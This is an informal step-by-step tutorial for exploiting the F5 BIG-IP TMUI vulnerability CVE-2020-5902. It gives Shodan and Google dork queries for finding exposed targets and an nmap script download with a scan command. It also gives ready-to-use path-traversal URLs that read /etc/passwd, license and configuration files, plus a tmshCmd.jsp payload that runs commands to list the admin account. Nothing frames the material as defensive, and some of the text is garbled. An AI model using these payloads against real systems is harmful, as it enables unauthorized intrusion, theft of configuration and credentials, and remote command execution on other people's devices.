Hello here we are going with a vulnerability known as CVE 2020 5902 or  F5 BIG-IP. So lets explore it with some simple steps as below
Before going to exploration let's discuss about this vulnerability such as F5 BIG-IP or CVE 2020-5902.

What is the F5 BIG-IP vulnerability and how this will happen?
  Generally this vulnerability was happened due to the TMUI of a BIG-IP products. The TMUI was the short hand form of Traffic Management User

  Google dorks:
  •	inurl:”/my.policy” big ip
  •	Inurl:my.logout.php3?
  •	inurl:/tmui/login.jsp/
                                               METHOD-1
Steps to follow:
1. Firstly find a target with shodan. So, in order to find it via shodan we use the following key word such as
  ----->title:"BIG-IP&reg."
  ----->http.favicon.hash:-335242539 "3992"
  ----->http.title:"BIG-IP&reg;- Redirect"


2. Now open yours burpsuite and firefox and just follow the below one. In case if you found a vulnerable url then try the following payloads such as
  ----->https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
  ----->https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts
  ----->https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
  ----->https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf  //see image in cve 2020 folder


3. So, now after doing this you should go to burpsuite and click on go so you can find the result on other hand. That's it!!!!

                                                    METHOD-2 via nmap+shodan

Steps to follow:
 1. Firstly go to the shodan and type the payload as
  ----->title:"BIG-IP&reg."
  So when you enter this as a result you can find a list of targets to try

2. Now download the nmap.nse script that was required for this type of attack if you had it please ignore if not just get it via following link
  ----->https://raw.githubusercontent.com/RootUp/PersonalStuff/master/http-vuln-cve2020-5902.nse
  Note: "Please make sure that the downloaded file was stored with .nse extension but not as .txt"

3. Now, just open the terminal and go with the one liner such as
  -----> nmap -v --script exaple.nse <ip address> -p443
So you can see that you will be encountered with a long paragraphs of code and gives us that whether the vulnerable was there

4. Now, after getting this vulnerability you should go with the payloads and the payloads link was given below
  ----->https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd
  ----->https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/hosts
  ----->https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.license
  ----->https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/config/bigip.conf
  ----->https://<IP>/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin
Now add the payloads at the end of the targets
